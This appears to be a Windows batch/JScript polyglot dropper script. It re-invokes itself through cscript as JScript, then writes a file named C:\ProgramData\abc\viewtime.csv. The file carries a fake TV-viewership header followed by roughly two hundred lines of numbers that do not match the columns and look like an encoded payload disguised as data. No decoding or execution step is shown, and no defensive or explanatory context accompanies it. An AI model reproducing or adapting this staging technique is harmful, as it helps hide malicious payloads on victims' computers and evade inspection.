@set @x=0 /*
@echo off
setlocal EnableDelayedExpansion

if defined __M__ goto :md
set "__M__=1"
cscript //nologo //E:JScript "%~f0" "%~f0" %*
exit /b 0
:md

if "%~1"=="__s__" goto :m

:m

if exist "C:\ProgramData\abc\viewtime.csv" (
    goto :f1d
)

:f1wd
set "D=C:\ProgramData\abc\viewtime.csv"
for %%F in ("!D!") do (
    if not exist "%%~dpF" mkdir "%%~dpF"
)
setlocal DisableDelayedExpansion
> "C:\ProgramData\abc\viewtime.csv" echo(Timeslot,Episodes,Viewers,Date,Viewers,Date,Viewers,TV season,Viewership rank,Avg. viewers
>> "C:\ProgramData\abc\viewtime.csv" echo(26.21;809.124;448.124;4138.352;50.650;52.559;112.8746;824.52;557.50;456.124;
>> "C:\ProgramData\abc\viewtime.csv" echo(1392.350;50.555;51.350;476.137;376.36;6515.732;68.837;68.436;24.0499;772.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(384.36;416.72;1205.837;76.436;8.487;72.5329;829.236;908.0;50.0;8702.472;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.832;36.924;0.9234;30.0;372.137;468.36;4854.756;72.839;132.336;232.4695;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.0;50.72;837.68;6739.636;48.672;141.368;36.2476;680.72;839.248;551.192;
>> "C:\ProgramData\abc\viewtime.csv" echo(8803.885;120.50;0.40;243.1929;870.72;839.132;436.248;1533.30;0.40;72.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.7383;536.96;572.141;45.53;2509.414;0.30;72.837;68.9310;636.64;572.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(468.36;1088.648;72.837;68.636;32.1963;576.139;776.36;756.65;8043.884;233.61;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.60;72.1998;839.84;636.64;672.141;4983.576;36.580;232.808;0.1572;40.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(472.141;576.36;8159.680;232.910;4.60;0.9450;751.192;672.129;896.208;4539.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.40;95.895;204.2489;904.204;904.204;904.204;0257.576;137.768;36.524;72.9441;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.84;636.16;572.137;3932.576;36.38;72.831;236.8604;540.72;839.76;636.64;
>> "C:\ProgramData\abc\viewtime.csv" echo(1557.772;139.368;36.648;255.2402;680.56;672.139;476.36;2067.556;72.837;1.772;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.0428;668.36;556.72;831.56;5268.70;117.321;72.839;76.1263;636.64;572.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(668.36;9534.348;255.680;48.472;139.4226;676.36;756.72;837.1;1364.572;131.896;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.895;204.9459;904.204;576.137;476.36;1617.332;68.837;68.336;24.9590;672.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(384.36;316.72;2871.837;76.736;8.587;72.1698;829.236;828.0;40.0;4273.898;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.436;48.538;198.3617;668.36;449.92;898.68;7199.636;50.46;198.568;36.9143;
>> "C:\ProgramData\abc\viewtime.csv" echo(551.22;898.68;436.52;1248.654;198.368;36.753;83.5093;898.68;536.54;432.198;
>> "C:\ProgramData\abc\viewtime.csv" echo(1430.368;36.755;113.898;68.1440;736.56;728.198;468.36;4183.457;89.898;68.536;
>> "C:\ProgramData\abc\viewtime.csv" echo(58.5452;627.198;568.36;759.1;5145.898;68.736;60.955;72.8223;841.84;436.48;
>> "C:\ProgramData\abc\viewtime.csv" echo(472.141;8991.476;36.748;232.468;11.9850;40.0;572.139;832.36;8943.844;0.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.772;139.8716;840.36;868.0;50.0;1311.572;137.772;24.572;139.2411;832.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(844.0;50.0;8873.472;139.840;36.876;0.7354;40.0;372.137;772.32;2011.672;
>> "C:\ProgramData\abc\viewtime.csv" echo(141.484;36.348;72.7376;839.132;736.144;60.0;4922.60;72.839;72.424;72.6681;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.132;436.144;70.0;7480.50;255.480;32.672;139.9526;840.36;844.0;70.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(5928.772;137.465;40.839;132.9004;336.160;30.0;60.65;1590.885;4.50;0.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(65.4951;884.0;716.0;40.139;1455.908;51.901;72.839;132.0272;636.144;60.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.255;6168.780;40.372;139.840;36.4853;844.0;60.0;572.137;4261.765;8.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(132.536;160.5099;70.0;60.68;839.192;5032.672;139.848;36.852;0.2148;60.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(472.139;832.36;8877.844;0.70;0.572;139.7533;372.8;932.195;49.0;6842.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.839;132.736;144.2312;30.0;50.72;839.64;7480.78;72.837;68.536;64.4375;
>> "C:\ProgramData\abc\viewtime.csv" echo(472.139;832.36;844.0;8993.30;0.839;76.436;64.4597;839.64;58.43;893.59;
>> "C:\ProgramData\abc\viewtime.csv" echo(1859.832;36.860;0.60;0.3328;815.74;772.139;832.36;0526.844;0.40;0.572;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.4962;380.8;372.139;832.36;2605.844;0.60;0.672;139.7733;572.8;932.91;
>> "C:\ProgramData\abc\viewtime.csv" echo(710.0;0574.50;72.839;132.336;144.4117;60.0;70.72;839.72;7641.58;232.590;
>> "C:\ProgramData\abc\viewtime.csv" echo(11.70;0.9267;672.152;572.139;840.36;2008.844;0.60;0.472;3.0079;665.8;
>> "C:\ProgramData\abc\viewtime.csv" echo(572.139;840.36;8347.844;0.60;0.672;137.2679;465.8;935.156;772.139;7655.832;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.844;0.40;0.5987;572.139;376.36;364.72;8672.837;72.58;184.31;0.8800;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.0;472.107;892.0;3969.372;139.840;36.844;0.9628;70.0;772.3;665.8;
>> "C:\ProgramData\abc\viewtime.csv" echo(3360.472;139.908;72.839;132.5170;536.144;60.0;70.72;6099.839;72.324;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(132.5768;436.144;40.0;60.255;6164.580;32.672;139.840;36.1742;844.0;70.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(572.137;5510.665;56.884;1.60;0.3554;70.72;807.192;517.72;5097.839;140.436;
>> "C:\ProgramData\abc\viewtime.csv" echo(144.40;0.1824;50.72;63.65;68.72;3633.839;208.472;139.832;36.2846;844.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.0;772.139;4412.672;24.472;139.832;36.3878;844.0;30.0;955.80;5534.632;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.839;140.736;144.5786;30.0;50.72;837.65;9559.748;184.31;0.40;0.5006;
>> "C:\ProgramData\abc\viewtime.csv" echo(572.107;892.30;572.139;2017.840;36.844;0.60;0.4022;672.3;765.8;576.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(6011.892;72.841;84.736;120.4655;372.139;840.36;844.0;6008.30;0.932;125.953;
>> "C:\ProgramData\abc\viewtime.csv" echo(255.4033;955.199;668.36;336.0;1921.40;0.60;72.841;68.3166;336.72;572.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(948.51;5650.892;185.748;0.40;0.6000;943.170;884.1;30.0;0738.50;72.807;
>> "C:\ProgramData\abc\viewtime.csv" echo(192.454;72.9563;839.76;736.64;572.3;3674.900;72.839;193.572;139.1371;840.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(844.0;60.0;7436.572;137.665;8.772;139.3242;832.36;844.0;40.0;9449.472;
>> "C:\ProgramData\abc\viewtime.csv" echo(131.892;64.885;8.2522;70.0;40.72;807.201;6377.60;72.837;68.512;72.4227;
>> "C:\ProgramData\abc\viewtime.csv" echo(372.139;832.36;844.0;5985.50;0.772;131.892;72.8068;885.8;30.0;60.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(4838.807;201.31;72.837;68.5461;412.72;372.139;832.36;2901.844;0.70;0.372;
>> "C:\ProgramData\abc\viewtime.csv" echo(131.5755;892.80;885.8;30.0;6714.50;72.807;201.52;72.9192;837.68;612.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(672.139;7569.832;36.844;0.50;0.8631;372.131;892.88;885.8;0975.30;0.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.807;201.9887;33.72;837.68;312.72;2411.772;139.832;36.844;0.2888;60.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(372.131;892.96;8644.885;8.60;0.40;72.5177;807.201;74.72;837.68;3469.612;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.372;139.832;36.8180;844.0;30.0;372.131;0012.892;104.885;8.70;0.2666;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.72;807.201;65.72;5628.837;68.612;72.899;68.0190;636.36;56.0;40.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(9249.899;68.736;32.50;0.3461;50.0;935.10;839.68;1316.736;32.955;192.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.6731;636.32;839.68;536.36;5229.557;68.336;32.825;93.9771;372.139;832.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(844.0;3455.50;0.472;139.780;8.1324;672.139;832.36;844.0;5297.30;0.372;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.572;24.0460;672.139;832.36;844.0;9045.30;0.955;80.632;72.0337;399.76;
>> "C:\ProgramData\abc\viewtime.csv" echo(436.32;672.139;4803.476;204.672;72.837;1.5681;572.139;832.36;844.0;5220.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.772;139.672;8.5903;932.81;59.0;40.72;9671.852;72.839;140.436;144.5639;
>> "C:\ProgramData\abc\viewtime.csv" echo(60.0;70.72;33.65;9737.78;72.839;140.436;144.4889;50.0;70.72;837.65;
>> "C:\ProgramData\abc\viewtime.csv" echo(8571.38;235.843;72.839;132.4127;736.144;60.0;40.72;1905.831;192.812;185.78;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.8422;70.0;472.107;901.0;9087.572;137.568;12.372;199.3294;468.36;336.1;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.0;7723.70;199.768;36.540;0.5696;30.0;60.235;710.139;1270.768;36.540;
>> "C:\ProgramData\abc\viewtime.csv" echo(255.892;137.0207;468.36;340.139;468.36;7649.536;57.668;36.540;125.3364;793.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.132;436.144;3345.60;0.30;72.839;80.9164;38.72;839.132;736.144;7740.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.70;72.839;72.7134;324.72;839.132;536.144;7351.30;0.40;255.480;32.1882;
>> "C:\ProgramData\abc\viewtime.csv" echo(772.99;776.36;740.72;7289.839;76.904;72.672;137.2902;71.72;839.132;536.144;
>> "C:\ProgramData\abc\viewtime.csv" echo(0188.70;0.30;72.839;72.9903;48.232;880.8;70.0;7604.472;152.772;139.840;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.0510;844.0;60.0;372.3;5683.465;8.472;139.840;36.0451;844.0;30.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(372.137;3820.765;8.935;143.372;139.4686;832.36;844.0;70.0;6724.839;76.436;
>> "C:\ProgramData\abc\viewtime.csv" echo(64.839;64.1291;48.43;893.139;892.68;1125.839;192.651;210.472;139.5163;776.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(764.232;76.7;6068.70;0.472;139.832;36.4203;844.0;50.0;772.139;2652.476;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.764;72.837;72.4523;48.72;829.196;828.0;5703.40;0.395;195.904;204.4423;
>> "C:\ProgramData\abc\viewtime.csv" echo(904.204;904.204;904.204;6316.904;204.904;204.372;137.6385;676.36;58.87;572.129;
>> "C:\ProgramData\abc\viewtime.csv" echo(6478.936;144.60;0.30;72.5175;839.140;636.160;70.0;8601.50;232.834;5.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.3634;772.137;768.36;472.72;7778.839;84.336;72.672;139.0159;840.36;860.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.0;3231.932;191.41;0.70;72.5856;839.132;336.160;60.0;6900.40;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(64.616;72.1517;837.68;336.48;899.68;8145.436;32.40;0.70;0.4165;472.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(768.36;348.131;1219.756;0.816;49.472;139.3144;468.36;648.139;50.139;1143.576;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.732;141.468;1.9337;54.137;768.36;632.72;9513.839;68.436;48.839;0.0084;
>> "C:\ProgramData\abc\viewtime.csv" echo(831.192;64.139;892.72;3935.839;76.336;48.772;3.1584;900.72;839.193;572.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(2162.568;36.648;235.897;139.4119;568.36;332.131;892.4;0472.837;68.336;32.572;
>> "C:\ProgramData\abc\viewtime.csv" echo(141.6898;768.36;388.72;839.248;9816.751;192.885;48.50;0.8498;50.243;870.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(841.5;0985.688;255.955;255.772;137.0009;468.36;664.72;899.68;5967.636;40.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.30;0.9901;565.184;548.0;60.0;6239.772;141.684;36.388;72.4657;839.76;
>> "C:\ProgramData\abc\viewtime.csv" echo(636.64;672.139;9368.832;36.860;0.30;0.0914;955.80;812.72;833.192;4745.816;
>> "C:\ProgramData\abc\viewtime.csv" echo(93.829;124.636;120.2138;30.0;31.0;817.60;8935.372;139.668;36.364;72.3347;
>> "C:\ProgramData\abc\viewtime.csv" echo(75.255;955.0;40.72;3382.537;0.50;255.955;72.1666;837.68;736.40;839.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(6979.436;32.772;139.476;36.9978;740.72;53.200;572.139;1631.893;72.839;76.636;
>> "C:\ProgramData\abc\viewtime.csv" echo(112.0455;772.139;584.36;388.72;0300.53;209.672;139.902;72.4939;359.193;819.2;
>> "C:\ProgramData\abc\viewtime.csv" echo(935.23;8271.472;139.468;36.812;72.5274;839.76;336.88;772.3;4709.900;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(193.672;137.6155;668.36;564.235;831.68;3591.839;76.736;32.776;139.4682;368.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(440.72;839.84;6020.636;72.472;139.840;36.6282;860.0;60.0;932.225;2810.42;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.60;139.768;36.2020;532.68;839.192;472.139;1435.832;36.860;0.70;0.2862;
>> "C:\ProgramData\abc\viewtime.csv" echo(572.139;780.16;772.139;3695.576;36.540;232.944;4.0670;40.0;472.139;668.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(7003.740;139.50;137.468;36.1206;656.184;61.0;60.0;5330.372;107.892;4.772;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.7892;776.36;540.72;43.200;2365.572;139.893;72.837;68.5811;736.80;839.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(736.56;1401.831;192.54;139.892;72.0339;839.76;636.40;372.3;1961.900;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(193.885;1.5771;40.0;70.72;807.201;7261.74;72.839;84.636;40.6510;372.3;
>> "C:\ProgramData\abc\viewtime.csv" echo(909.72;839.202;1477.776;139.900;68.839;193.7665;672.139;832.36;860.0;2882.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.672;139.380;32.0197;572.139;832.36;860.0;7017.50;0.572;139.472;24.7238;
>> "C:\ProgramData\abc\viewtime.csv" echo(955.84;336.80;844.72;0815.829;196.844;0.40;0.5829;595.195;904.204;904.204;
>> "C:\ProgramData\abc\viewtime.csv" echo(0318.904;204.904;204.904;204.6073;904.204;372.137;784.36;5528.316;72.837;76.336;
>> "C:\ProgramData\abc\viewtime.csv" echo(8.6403;772.131;936.104;765.184;4470.30;16.50;0.451;210.8980;672.139;676.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(820.232;3402.908;4.40;0.472;184.9927;800.105;815.111;814.100;6690.801;114.372;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.768;36.3132;456.65;884.8;70.0;9128.30;72.841;84.536;56.2319;572.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(676.36;820.232;4531.744;4.60;0.884;1.1549;30.0;60.72;807.192;5456.416;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.839;76.736;120.1593;472.3;900.72;839.193;8366.372;137.668;36.432;72.1735;
>> "C:\ProgramData\abc\viewtime.csv" echo(899.68;436.48;70.0;4749.30;0.884;1.60;0.6082;60.72;805.192;699.1;
>> "C:\ProgramData\abc\viewtime.csv" echo(7367.50;0.772;139.676;36.7841;812.72;43.65;58.76;6212.839;192.472;141.484;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.3880;648.72;839.76;536.112;4822.932;195.948;255.955;72.0302;899.68;736.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.0;9752.40;0.884;1.30;0.6620;30.72;805.192;809.1;3310.30;0.372;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.676;36.1090;812.72;73.65;48.76;5404.839;192.672;141.784;36.3306;640.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.76;436.112;6901.932;147.948;255.955;184.9719;41.0;50.0;772.105;9501.892;
>> "C:\ProgramData\abc\viewtime.csv" echo(120.51;0.60;72.1312;839.76;736.112;472.3;1132.365;8.772;139.908;72.8653;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.76;336.40;772.139;3886.668;36.812;255.380;32.9405;572.137;668.36;364.51;
>> "C:\ProgramData\abc\viewtime.csv" echo(4563.901;255.384;36.464;72.2587;837.68;436.72;884.1;0061.60;0.70;72.805;
>> "C:\ProgramData\abc\viewtime.csv" echo(192.1763;826.1;50.0;372.139;9801.776;36.812;72.73;65.7148;58.72;839.208;
>> "C:\ProgramData\abc\viewtime.csv" echo(572.139;7927.376;36.440;72.839;68.0117;336.112;955.80;532.185;7814.764;0.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.772;107.2076;901.0;672.139;384.36;7305.632;72.837;4.510;184.1079;764.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.0;772.107;2309.892;0.572;139.376;36.4519;432.72;899.68;51.8;9447.63;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.40;0.884;64.3785;50.0;70.72;807.192;6903.40;72.839;76.436;32.1346;
>> "C:\ProgramData\abc\viewtime.csv" echo(572.3;900.72;839.193;3811.885;8.70;0.60;72.3272;807.201;51.72;841.21;
>> "C:\ProgramData\abc\viewtime.csv" echo(5699.560;5.30;0.472;137.4553;784.8;616.184;41.0;8625.30;0.672;105.892;
>> "C:\ProgramData\abc\viewtime.csv" echo(144.4463;61.0;30.72;839.76;6235.436;112.472;3.365;8.2641;472.139;908.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.76;3261.636;48.772;139.368;36.3857;812.255;680.32;885.64;7456.50;0.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.807;201.5773;51.72;839.84;736.32;2840.672;137.44;10.884;64.8950;30.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.72;807.192;7326.61;72.839;76.736;32.5091;372.199;768.1;48.4;8942.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.50;184.664;0.5917;50.0;372.107;892.1;7559.772;139.776;36.332;72.0162;
>> "C:\ProgramData\abc\viewtime.csv" echo(43.200;572.139;893.185;5161.68;0.60;0.772;107.7564;901.0;572.139;384.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(4471.372;72.837;84.58;16.6198;772.199;668.36;580.2;1550.60;0.60;184.564;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.8209;50.0;372.107;892.1;8864.772;139.376;36.632;72.9857;63.200;472.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(893.185;4599.78;0.60;0.672;107.9015;901.1;672.139;484.36;0667.680;72.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(84.58;16.4350;884.64;50.0;70.72;0154.807;192.61;72.839;76.7966;336.32;
>> "C:\ProgramData\abc\viewtime.csv" echo(372.3;900.72;6138.839;193.885;8.70;0.1366;60.72;807.201;42.72;7950.841;
>> "C:\ProgramData\abc\viewtime.csv" echo(21.810;4.60;0.0643;772.137;484.8;516.72;3971.831;196.804;195.904;204.7381;
>> "C:\ProgramData\abc\viewtime.csv" echo(904.204;668.137;376.36;8845.432;76.837;68.636;24.5115;472.137;384.36;616.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(2685.837;76.736;8.372;131.9770;936.56;884.1;50.0;6735.50;72.807;192.48;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.6369;839.76;636.72;772.3;3083.900;72.839;193.465;184.6410;78.0;30.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(551.210;0167.472;139.900;232.816;2.9828;40.0;884.1;50.0;6240.50;72.807;
>> "C:\ProgramData\abc\viewtime.csv" echo(192.316;72.6273;839.76;536.72;772.3;4472.900;72.839;193.472;137.0364;468.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(432.184;564.0;3875.40;0.372;107.892;2.9313;772.139;776.36;532.72;7633.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(84.536;64.672;139.1555;682.40;572.137;620.1;9547.884;64.40;0.60;72.4963;
>> "C:\ProgramData\abc\viewtime.csv" echo(807.192;32.72;839.76;7412.436;32.372;199.368;1.8664;58.4;70.0;60.184;
>> "C:\ProgramData\abc\viewtime.csv" echo(9652.564;0.40;0.772;107.1584;892.2;772.139;776.36;3155.532;72.73;200.472;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.2044;893.185;58.0;40.0;0062.772;107.901;0.372;139.1670;484.36;480.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.84;2744.58;16.884;64.30;0.0711;50.72;807.192;72.72;4025.839;76.536;
>> "C:\ProgramData\abc\viewtime.csv" echo(32.472;3.6714;900.72;839.193;885.8;8083.30;0.30;72.807;201.1054;51.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(584.36;488.72;7082.837;84.48;16.884;64.6369;60.0;40.72;807.192;2138.42;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.839;76.736;32.0529;772.3;900.72;839.193;5416.885;8.60;0.40;72.5603;
>> "C:\ProgramData\abc\viewtime.csv" echo(807.201;52.72;899.68;9720.58;16.70;48.40;0.7931;884.64;70.0;40.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(4529.807;192.52;72.839;76.9936;736.32;672.3;900.72;8226.839;193.885;8.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.6785;50.72;807.201;73.72;6516.899;68.68;16.664;0.2367;40.0;469.51;
>> "C:\ProgramData\abc\viewtime.csv" echo(892.72;0620.839;84.636;32.672;141.3332;413.49;43.0;70.72;4185.839;68.736;
>> "C:\ProgramData\abc\viewtime.csv" echo(64.955;80.0127;780.72;837.68;436.40;9814.372;139.776;36.540;72.6408;839.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(336.64;955.80;4574.588;51.910;72.839;76.5330;636.40;572.139;668.36;6159.464;
>> "C:\ProgramData\abc\viewtime.csv" echo(255.780;96.672;139.1652;576.36;740.72;839.68;0906.736;64.955;80.804;144.6335;
>> "C:\ProgramData\abc\viewtime.csv" echo(572.131;896.56;895.204;8474.904;204.904;204.672;137.0054;776.36;78.72;831.236;
>> "C:\ProgramData\abc\viewtime.csv" echo(3880.472;72.899;68.436;32.8912;30.0;40.0;572.184;9226.40;0.953;255.955;
>> "C:\ProgramData\abc\viewtime.csv" echo(7.6424;50.0;372.137;668.36;7728.540;72.831;124.736;32.6011;30.117;353.65;
>> "C:\ProgramData\abc\viewtime.csv" echo(885.4;5622.60;0.50;65.884;0.6366;448.0;60.186;40.0;8180.71;0.772;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.676;36.0824;740.72;839.68;436.80;4575.955;80.540;72.837;68.0644;736.32;
>> "C:\ProgramData\abc\viewtime.csv" echo(472.139;468.36;4020.540;72.345;0.30;1.7652;50.72;837.68;536.40;0183.935;
>> "C:\ProgramData\abc\viewtime.csv" echo(195.572;184.800;105.2675;815.111;814.100;801.114;0346.472;137.468;36.648;65.7871;
>> "C:\ProgramData\abc\viewtime.csv" echo(884.8;50.0;50.72;7902.841;84.736;48.472;139.9460;476.36;432.232;462.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(2656.70;0.884;1.50;0.6641;60.72;807.192;58.72;4418.839;76.636;32.772;
>> "C:\ProgramData\abc\viewtime.csv" echo(3.6104;900.72;839.193;765.184;5028.78;0.30;0.672;141.5822;684.36;680.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.200;0251.932;23.50;0.50;72.7956;839.68;336.32;572.131;9468.896;72.895;
>> "C:\ProgramData\abc\viewtime.csv" echo(204.904;204.2598;904.204;904.204;904.204;0436.904;204.904;204.676;137.4808;768.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(524.72;837.84;9033.736;16.772;137.476;36.1926;48.72;831.236;540.72;7818.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.536;48.472;137.5356;44.36;672.139;368.36;8988.656;72.837;68.536;8.4722;
>> "C:\ProgramData\abc\viewtime.csv" echo(772.139;368.36;764.72;0045.837;68.336;16.672;139.7374;768.36;564.72;955.200;
>> "C:\ProgramData\abc\viewtime.csv" echo(3540.372;137.568;36.664;72.7129;831.124;336.16;30.116;5949.640;72.839;4.336;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.9776;839.76;636.8;515.182;6342.49;136.58;72.839;4.2692;536.72;955.192;
>> "C:\ProgramData\abc\viewtime.csv" echo(372.137;1923.74;36.672;139.568;36.0956;68.72;955.192;672.137;4591.368;36.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(235.885;72.0461;839.68;636.48;372.131;3223.896;40.895;204.904;204.8470;904.204;
>> "C:\ProgramData\abc\viewtime.csv" echo(904.204;904.204;5134.676;137.668;36.424;137.8316;784.36;616.72;837.76;7347.536;
>> "C:\ProgramData\abc\viewtime.csv" echo(8.372;131.936;24.9679;572.139;768.36;432.72;0838.837;4.736;72.839;68.4961;
>> "C:\ProgramData\abc\viewtime.csv" echo(636.48;372.137;568.36;7637.68;72.839;68.336;48.0405;572.255;900.72;837.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(0147.336;48.572;131.824;36.9299;68.0;818.24;572.139;4646.34;36.415;182.776;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.3686;540.136;58.72;839.4;1782.736;72.955;192.672;137.9741;64.36;935.201;
>> "C:\ProgramData\abc\viewtime.csv" echo(472.139;9695.468;36.732;72.831;196.3090;724.195;904.204;904.204;1248.672;137.384;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.316;72.7526;837.76;536.8;372.131;3759.936;88.772;139.576;36.8134;496.232;
>> "C:\ProgramData\abc\viewtime.csv" echo(884.0;50.0;8044.837;68.436;36.899;68.5913;536.48;812.0;70.0;9418.899;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.436;52.653;0.7882;30.0;899.68;736.56;4158.816;0.40;0.899;68.9147;
>> "C:\ProgramData\abc\viewtime.csv" echo(336.60;698.0;60.0;4048.899;68.536;64.767;0.8742;70.0;899.68;536.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(1827.650;0.30;0.899;68.7059;536.72;576.0;30.0;7376.899;68.536;76.748;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.4587;60.0;899.68;436.32;4285.50;0.60;0.935;10.7440;839.68;336.32;
>> "C:\ProgramData\abc\viewtime.csv" echo(955.192;8684.837;68.336;32.839;68.9069;536.36;657.68;736.32;4049.815;58.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.336;32.7567;372.139;376.36;696.15;9082.890;4.51;137.768;36.4482;340.51;
>> "C:\ProgramData\abc\viewtime.csv" echo(910.139;568.36;9381.432;185.68;0.70;0.2301;947.241;839.194;839.192;1154.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(76.436;40.651;76.7728;832.48;839.193;839.76;2125.436;32.372;139.484;36.5050;
>> "C:\ProgramData\abc\viewtime.csv" echo(804.136;54.10;935.178;7509.839;68.736;36.572;139.2425;476.36;804.198;74.1;
>> "C:\ProgramData\abc\viewtime.csv" echo(8067.40;184.31;0.70;0.0496;772.131;896.88;895.204;6271.904;204.904;204.672;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.1045;776.36;58.72;831.236;8626.324;199.54;36.60;0.9321;30.0;839.4;
>> "C:\ProgramData\abc\viewtime.csv" echo(436.72;5569.839;76.336;32.715;190.8708;74.1;831.248;955.116;0885.410;139.74;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.955;192.1766;837.4;636.235;929.139;0284.54;36.472;131.896;24.6160;895.204;
>> "C:\ProgramData\abc\viewtime.csv" echo(904.204;904.204;8194.904;204.904;204.904;204.9415;904.204;672.137;476.36;8119.48;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.831;236.324;199.2582;34.36;40.0;30.0;3976.935;8.839;4.636;255.4261;
>> "C:\ProgramData\abc\viewtime.csv" echo(892.137;74.36;472.99;5178.74;36.672;139.676;36.4430;632.15;890.4;41.133;
>> "C:\ProgramData\abc\viewtime.csv" echo(3140.892;117.37;139.64;36.0987;955.192;935.2;935.222;7714.572;131.896;24.895;
>> "C:\ProgramData\abc\viewtime.csv" echo(204.3546;904.204;904.204;904.204;9372.372;184.50;0.953;255.9103;955.7;60.0;
